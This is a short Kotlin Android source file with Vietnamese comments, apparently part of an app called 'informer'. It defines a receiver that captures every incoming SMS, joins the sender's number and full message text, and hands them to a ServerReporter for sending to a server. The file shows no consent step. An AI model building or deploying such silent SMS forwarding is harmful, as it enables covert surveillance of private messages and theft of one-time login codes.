package com.example.informer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // Kiểm tra hành động nhận tin nhắn SMS
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            // Trích xuất mảng tin nhắn gửi đến từ hệ thống
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (!messages.isNullOrEmpty()) {
                val firstMessage = messages[0]
                val incomingNumber = firstMessage.originatingAddress ?: "Không rõ số"

                // Gộp toàn bộ nội dung nếu tin nhắn dài bị chia làm nhiều phần
                val fullContent = messages.joinToString(separator = "") { it.messageBody ?: "" }

                MainActivity.addLog("💬 [Receiver] Nhận tin nhắn từ $incomingNumber")
                Log.d("SMS_RECEIVER", "Nội dung: $fullContent")

                // Đẩy thông tin thực tế sang ServerReporter
                ServerReporter.sendEvent(
                    context = context,
                    type = "SMS",
                    incomingNumber = incomingNumber,
                    content = fullContent
                )
            }
        }
    }
}